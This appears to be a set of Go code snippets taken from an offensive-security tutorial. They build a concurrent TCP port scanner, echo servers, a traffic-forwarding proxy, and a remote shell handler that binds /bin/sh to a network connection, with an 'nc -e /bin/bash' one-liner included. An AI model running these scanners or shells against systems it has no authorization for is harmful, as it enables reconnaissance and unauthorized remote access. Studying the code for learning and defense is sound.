["```\npackage main\n\nimport (\n    \"fmt\"\n    \"net\"\n)\n\nfunc main() {\n    _, err := net.Dial(\"tcp\", \"scanme.nmap.org:80\")\n if err == nil {\n        fmt.Println(\"Connection successful\")\n    }\n}\n```", "```\nfor i:=1; i <= 1024; i++ {\n}\n```", "```\npackage main\n\nimport (\n    \"fmt\"\n)\n\nfunc main() {\n    for i := 1; i <= 1024; i++ {\n        address := fmt.Sprintf(\"scanme.nmap.org:%d\", i)\n        fmt.Println(address)\n    }\n}\n```", "```\npackage main\n\nimport (\n    \"fmt\"\n    \"net\"\n)\n\nfunc main() {\n    for i := 1; i <= 1024; i++ {\n        address := fmt.Sprintf(\"scanme.nmap.org:%d\", i)\n        conn, err := net.Dial(\"tcp\", address)\n        if err != nil {\n            // port is closed or filtered.\n            continue\n        }\n        conn.Close()\n        fmt.Printf(\"%d open\\n\", i)\n    }\n}\n```", "```\npackage main\n\nimport (\n    \"fmt\"\n    \"net\"\n)\n\nfunc main() {\n    for i := 1; i <= 1024; i++ {\n        go func(j int) {\n            address := fmt.Sprintf(\"scanme.nmap.org:%d\", j)\n            conn, err := net.Dial(\"tcp\", address)\n if err != nil {\n                return\n            }\n            conn.Close()\n            fmt.Printf(\"%d open\\n\", j)\n        }(i)\n    }\n}\n```", "```\n$ time ./tcp-scanner-too-fast\n./tcp-scanner-too-fast  0.00s user 0.00s system 90% cpu 0.004 total\n```", "```\nvar wg sync.WaitGroup\n```", "```\npackage main\n\nimport (\n    \"fmt\"\n    \"net\"\n    \"sync\"\n)\nfunc main() {\n ❶ var wg sync.WaitGroup\n    for i := 1; i <= 1024; i++ {\n     ❷ wg.Add(1)\n        go func(j int) {\n         ❸ defer wg.Done()\n            address := fmt.Sprintf(\"scanme.nmap.org:%d\", j)\n            conn, err := net.Dial(\"tcp\", address)\n            if err != nil {\n                return\n            }\n            conn.Close()\n            fmt.Printf(\"%d open\\n\", j)\n        }(i)\n    }\n ❹ wg.Wait()\n}\n```", "```\nfunc worker(ports chan int, wg *sync.WaitGroup) {\n    for p := range ports {\n        fmt.Println(p)\n        wg.Done()\n    }\n}\n```", "```\npackage main\n\nimport (\n    \"fmt\"\n    \"sync\"\n)\n\nfunc worker(ports chan int, wg *sync.WaitGroup) {\n ❶ for p := range ports {\n        fmt.Println(p)\n        wg.Done()\n    }\n}\n\nfunc main() {\n    ports := make❷(chan int, 100)\n    var wg sync.WaitGroup\n ❸ for i := 0; i < cap(ports); i++ {\n        go worker(ports, &wg)\n    }\n    for i := 1; i <= 1024; i++ {\n        wg.Add(1)\n     ❹ ports <- i\n    }\n    wg.Wait()\n ❺ close(ports)\n}\n```", "```\n   package main\n\n   import (\n       \"fmt\"\n       \"net\"\n       \"sort\"\n   )\n\n❶ func worker(ports, results chan int) {\n       for p := range ports {\n           address := fmt.Sprintf(\"scanme.nmap.org:%d\", p)\n           conn, err := net.Dial(\"tcp\", address)\n           if err != nil {\n            ❷ results <- 0\n               continue\n           }\n           conn.Close()\n        ❸ results <- p\n       }\n   }\n   func main() {\n       ports := make(chan int, 100)\n    ❹ results := make(chan int)\n    ❺ var openports []int\n\n       for i := 0; i < cap(ports); i++ {\n           go worker(ports, results)\n       }\n\n    ❻ go func() {\n          for i := 1; i <= 1024; i++ {\n              ports <- i\n           }\n       }()\n\n    ❼ for i := 0; i < 1024; i++ {\n           port := <-results\n           if port != 0 {\n               openports = append(openports, port)\n           }\n       }\n\n       close(ports)\n       close(results)\n    ❽ sort.Ints(openports)\n       for _, port := range openports {\n           fmt.Printf(\"%d open\\n\", port)\n    }\n}\n```", "```\ntype Reader interface {\n    Read(p []byte) (n int, err error)\n}\ntype Writer interface {\n    Write(p []byte) (n int, err error)\n}\n```", "```\ntype FooReader struct {}\nfunc (fooReader *FooReader) Read(p []byte) (int, error) {\n    // Read some data from somewhere, anywhere.\n return len(dataReadFromSomewhere), nil\n}\n```", "```\ntype FooWriter struct {}\nfunc (fooWriter *FooWriter) Write(p []byte) (int, error) {\n    // Write data somewhere.\n    return len(dataWrittenSomewhere), nil\n}\n```", "```\n   package main\n\n   import (\n       \"fmt\"\n       \"log\"\n       \"os\"\n   )\n\n   // FooReader defines an io.Reader to read from stdin.\n❶ type FooReader struct{}\n\n   // Read reads data from stdin.\n❷ func (fooReader *FooReader) Read(b []byte) (int, error) {\n       fmt.Print(\"in > \")\n       return os.Stdin.Read(b)❸\n   }\n\n   // FooWriter defines an io.Writer to write to Stdout.\n❹ type FooWriter struct{}\n\n   // Write writes data to Stdout.\n❺ func (fooWriter *FooWriter) Write(b []byte) (int, error) {\n       fmt.Print(\"out> \")\n       return os.Stdout.Write(b)❻\n   }\n\n   func main() {\n       // Instantiate reader and writer.\n       var (\n           reader FooReader\n           writer FooWriter\n       )\n\n       // Create buffer to hold input/output.\n    ❼ input := make([]byte, 4096)\n // Use reader to read input.\n       s, err := reader.Read(input)❽\n       if err != nil {\n           log.Fatalln(\"Unable to read data\")\n       }\n       fmt.Printf(\"Read %d bytes from stdin\\n\", s)\n\n       // Use writer to write output.\n       s, err = writer.Write(input)❾\n       if err != nil {\n           log.Fatalln(\"Unable to write data\")\n       }\n       fmt.Printf(\"Wrote %d bytes to stdout\\n\", s)\n}\n```", "```\n$ go run main.go\nin > hello world!!!\nRead 15 bytes from stdin\nout> hello world!!!\nWrote 4096 bytes to stdout\n```", "```\nfunc Copy(dst io.Writer, src io.Reader) (written int64, error)\n```", "```\nfunc main() {\n    var (\n        reader FooReader\n        writer FooWriter\n    )\n if _, err := io.Copy(&writer, &reader)❶; err != nil {\n        log.Fatalln(\"Unable to read/write data\")\n    }\n}\n```", "```\npackage main\n\nimport (\n    \"log\"\n    \"net\"\n)\n\n// echo is a handler function that simply echoes received data.\nfunc echo(conn net.Conn) {\n    defer conn.Close()\n\n    // Create a buffer to store received data.\n    b := make([]byte, 512)\n ❶ for {\n        // Receive data via conn.Read into a buffer.\n        size, err := conn.Read❷(b[0:])\n        if err == io.EOF {\n            log.Println(\"Client disconnected\")\n            break\n        }\n        if err != nil {\n            log.Println(\"Unexpected error\")\n            break\n        }\n        log.Printf(\"Received %d bytes: %s\\n\", size, string(b))\n\n        // Send data via conn.Write.\n        log.Println(\"Writing data\")\n        if _, err := conn.Write❸(b[0:size]); err != nil {\n            log.Fatalln(\"Unable to write data\")\n        }\n    }\n}\n\nfunc main() {\n    // Bind to TCP port 20080 on all interfaces.\n ❹ listener, err := net.Listen(\"tcp\", \":20080\")\n    if err != nil {\n        log.Fatalln(\"Unable to bind to port\")\n    }\n    log.Println(\"Listening on 0.0.0.0:20080\")\n ❺ for {\n        // Wait for connection. Create net.Conn on connection established.\n     ❻ conn, err := listener.Accept()\n        log.Println(\"Received connection\")\n        if err != nil {\n            log.Fatalln(\"Unable to accept connection\")\n        }\n        // Handle the connection. Using goroutine for concurrency.\n     ❼ go echo(conn)\n    }\n}\n```", "```\n$ telnet localhost 20080\nTrying 127.0.0.1...\nConnected to localhost.\nEscape character is '^]'.\ntest of the echo server\ntest of the echo server\n```", "```\n$ go run main.go\n2020/01/01 06:22:09 Listening on 0.0.0.0:20080\n2020/01/01 06:22:14 Received connection\n2020/01/01 06:22:18 Received 25 bytes: test of the echo server\n2020/01/01 06:22:18 Writing data\n```", "```\nfunc echo(conn net.Conn) {\n    defer conn.Close()\n\n ❶ reader := bufio.NewReader(conn)\n    s, err := reader.ReadString('\\n')❷\n    if err != nil {\n        log.Fatalln(\"Unable to read data\")\n    }\n    log.Printf(\"Read %d bytes: %s\", len(s), s)\n\n    log.Println(\"Writing data\")\n ❸ writer := bufio.NewWriter(conn)\n    if _, err := writer.WriteString(s)❹; err != nil {\n        log.Fatalln(\"Unable to write data\")\n    }\n ❺ writer.Flush()\n}\n```", "```\nfunc echo(conn net.Conn) {\n    defer conn.Close()\n    // Copy data from io.Reader to io.Writer via io.Copy().\n    if _, err := io.Copy(conn, conn); err != nil {\n        log.Fatalln(\"Unable to read/write data\")\n    }\n}\n```", "```\nfunc handle(src net.Conn) {\n    dst, err := net.Dial(\"tcp\", \"joescatcam.website:80\")❶\n    if err != nil {\n        log.Fatalln(\"Unable to connect to our unreachable host\")\n    }\n    defer dst.Close()\n\n    // Run in goroutine to prevent io.Copy from blocking\n ❷ go func() {\n        // Copy our source's output to the destination\n        if _, err := io.Copy(dst, src)❸; err != nil {\n            log.Fatalln(err)\n        }\n    }()\n    // Copy our destination's output back to our source\n    if _, err := io.Copy(src, dst)❹; err != nil {\n        log.Fatalln(err)\n    }\n}\nfunc main() {\n    // Listen on local port 80\n    listener, err := net.Listen(\"tcp\", \":80\")\n    if err != nil {\n        log.Fatalln(\"Unable to bind to port\")\n    }\n\n    for {\n        conn, err := listener.Accept()\n        if err != nil {\n            log.Fatalln(\"Unable to accept connection\")\n        }\n        go handle(conn)\n    }\n}\n```", "```\n$ curl -i -X GET http://joesproxy.com\nHTTP/1.1 200 OK\nDate: Wed, 25 Nov 2020 19:51:54 GMT\nServer: Apache/2.4.18 (Ubuntu)\nLast-Modified: Thu, 27 Jun 2019 15:30:43 GMT\nETag: \"6d-519594e7f2d25\"\nAccept-Ranges: bytes\nContent-Length: 109\nVary: Accept-Encoding\nContent-Type: text/html\n--snip--\n```", "```\n$ nc –lp 13337 –e /bin/bash\n```", "```\ncmd := exec.Command(\"/bin/sh\", \"-i\")\n```", "```\ncmd.Stdin = conn\ncmd.Stdout = conn\n```", "```\nif err := cmd.Run(); err != nil {\n    // Handle error.\n}\n```", "```\n   // Flusher wraps bufio.Writer, explicitly flushing on all writes.\n   type Flusher struct {\n       w *bufio.Writer\n   }\n\n   // NewFlusher creates a new Flusher from an io.Writer.\n   func NewFlusher(w io.Writer) *Flusher {\n       return &Flusher{\n           w: bufio.NewWriter(w),\n       }\n   }\n\n   // Write writes bytes and explicitly flushes buffer.\n❶ func (foo *Flusher) Write(b []byte) (int, error) {\n       count, err := foo.w.Write(b)❷\n       if err != nil {\n           return -1, err\n       }\n       if err := foo.w.Flush()❸; err != nil {\n           return -1, err\n       }\n       return count, err\n   }\n```", "```\nfunc handle(conn net.Conn) {\n    // Explicitly calling /bin/sh and using -i for interactive mode\n    // so that we can use it for stdin and stdout.\n    // For Windows use exec.Command(\"cmd.exe\").\n    cmd := exec.Command(\"/bin/sh\", \"-i\")\n\n    // Set stdin to our connection\n    cmd.Stdin = conn\n\n    // Create a Flusher from the connection to use for stdout.\n    // This ensures stdout is flushed adequately and sent via net.Conn.\n    cmd.Stdout = NewFlusher(conn)\n\n    // Run the command.\n    if err := cmd.Run(); err != nil {\n log.Fatalln(err)\n    }\n}\n```", "```\nfunc Pipe() (*PipeReader, *PipeWriter)\n```", "```\nfunc handle(conn net.Conn) {\n    // Explicitly calling /bin/sh and using -i for interactive mode\n    // so that we can use it for stdin and stdout.\n    // For Windows use exec.Command(\"cmd.exe\").\n    cmd := exec.Command(\"/bin/sh\", \"-i\")\n    // Set stdin to our connection\n    rp, wp := io.Pipe()❶\n    cmd.Stdin = conn\n ❷ cmd.Stdout = wp\n ❸ go io.Copy(conn, rp)\n    cmd.Run()\n    conn.Close()\n}\n```"]